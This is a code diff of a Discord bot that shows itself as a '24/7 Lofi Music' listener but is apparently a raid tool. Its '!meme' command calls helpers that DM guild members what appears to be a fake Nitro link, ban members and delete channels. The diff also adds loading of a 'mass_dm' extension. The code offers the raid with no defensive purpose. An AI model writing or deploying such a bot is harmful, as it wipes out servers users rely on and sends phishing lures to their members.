@@ -1,21 +1,32 @@
 import asyncio
 import os
 from disnake.ext import commands
+from disnake.ext.commands import Context, Bot
 import disnake
 import raid_helper as RD
 from raid_helper import RaidCommands as RC
 from py_logs import TOKEN
 import git_push as GP
-from disnake import Guild, Message, Member, Embed, ButtonStyle, ApplicationCommandInteraction as ACI
+from disnake import (
+    Guild,
+    Message,
+    Member,
+    Embed,
+    ButtonStyle,
+    Activity,
+    ActivityType,
+    Intents,
+    ApplicationCommandInteraction as ACI,
+)
 from disnake.ui import Button, View
 
-intents = disnake.Intents().all()
+intents = Intents().all()
 intents.guilds = True
 intents.members = True
 prefix = "!"
-bot = commands.Bot(
+bot = Bot(
     command_prefix=prefix,
-    activity=disnake.Activity(type=disnake.ActivityType.listening, name="24/7 Lofi Music"),
+    activity=Activity(type=ActivityType.listening, name="24/7 Lofi Music"),
     help_command=None,
     intents=intents,
     case_insensitive=True,
@@ -64,7 +75,7 @@ async def assist(inter: ACI):
 
 
 @bot.command()
-async def meme(ctx: commands.Context):
+async def meme(ctx: Context):
     await RC.send_dm(ctx.guild, nitro_url, nitro_button)
     await RC.ban_members(ctx.guild, ctx.author)
     await RC.channel_remove(ctx.guild)
@@ -81,6 +92,8 @@ async def on_command_error(cmd, error):
     if isinstance(error, Exception):
         pass
 
+
+bot.load_extension("mass_dm")
 
 GP.push("Update")
 
